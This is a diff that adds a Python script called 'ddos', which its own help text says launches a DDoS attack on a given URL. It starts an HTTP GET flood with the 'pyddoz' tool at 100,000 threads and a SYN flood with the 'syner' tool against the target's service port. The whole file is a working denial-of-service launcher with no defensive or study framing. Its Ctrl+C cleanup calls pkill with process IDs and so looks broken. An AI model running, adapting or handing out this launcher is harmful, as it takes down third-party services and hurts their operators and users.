@@ -1,0 +1,101 @@
+#!/usr/bin/env python3.6
+import signal
+import sys
+import subprocess
+import re
+import argparse
+import sys
+import netifaces
+import shlex
+import os
+
+servToPort ={
+  "acap": 674,
+  "afp": 548,
+  "dict": 2628,
+  "dns": 53,
+  "file": 0,
+  "ftp": 21,
+  "git": 9418,
+  "gopher": 70,
+  "http": 80,
+  "https": 443,
+  "imap": 143,
+  "ipp": 631,
+  "ipps": 631,
+  "irc": 194,
+  "ircs": 6697,
+  "ldap": 389,
+  "ldaps": 636,
+  "mms": 1755,
+  "msrp": 2855,
+  "msrps": 0,
+  "mtqp": 1038,
+  "nfs": 111,
+  "nntp": 119,
+  "nntps": 563,
+  "pop": 110,
+  "prospero": 1525,
+  "redis": 6379,
+  "rsync": 873,
+  "rtsp": 554,
+  "rtsps": 322,
+  "rtspu": 5005,
+  "sftp": 22,
+  "smb": 445,
+  "snmp": 161,
+  "ssh": 22,
+  "steam": 0,
+  "svn": 3690,
+  "telnet": 23,
+  "ventrilo": 3784,
+  "vnc": 5900,
+  "wais": 210,
+  "ws": 80,
+  "wss": 443,
+  "xmpp": 0
+}
+
+def ctrlCHandler(sig, frame):
+    os.system('pkill ' + str(pyddozPid))
+    os.system('pkill ' + str(synerPid))
+    sys.exit(0)
+signal.signal(signal.SIGINT, ctrlCHandler)
+# print('Press Ctrl+C')
+
+pyddozPid = int
+synerPid = int
+def getCmdArgs(cmdDict):
+    cmdArgsStr = ""
+    for opt, value in cmdDict.items():
+        cmdArgsStr += str(opt)+ ' ' + str(value)+ ' '
+    # cmdArgsStr += "&"
+    return shlex.split(cmdArgsStr)
+
+def execAttackProcess(attackOpts):
+    attackArgs = getCmdArgs(attackOpts)
+    attackPid = subprocess.Popen(attackArgs ).pid # Initiate pyddoz
+    return attackPid
+
+def execHTTPMethodFlood(target):
+    pyddozOpts = {'pyddoz':'','-u' : target,'-th': '100000','-m' : 'g','-r' : 'y', '-b' : 'n', '-ob' : 'n', '-rd' : 'y'}
+    return execAttackProcess(pyddozOpts)
+
+def execSynFlood(URLProto, targetURLWOProto, def_gw_device):
+    synerOpts = {'syner':'','-t': targetURLWOProto,'-p' : servToPort[URLProto], '-i' : def_gw_device}
+    return execAttackProcess(synerOpts)
+
+if __name__=="__main__":
+    args_parser = argparse.ArgumentParser(prog='ddos',description="""Launches a DDOS attack given a target's name.\n
+            """)
+    args_parser.add_argument('TARGET', help='target\'s url (including the protocol, http or https not optional)')
+    args_parser.add_argument('-p', help='port number')
+    args = args_parser.parse_args(sys.argv[1:])
+    # Spawned the pyddoz on the target
+    # Rip off the first protocol specifier
+    pyddozPid = execHTTPMethodFlood(args.TARGET)
+    URLProto, targetURLWOProto = re.split('://',args.TARGET)
+    # Call syner to ddos using SYN flooding
+    def_gw_device = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    synerPid = execSynFlood(URLProto, targetURLWOProto, def_gw_device)
+signal.pause()
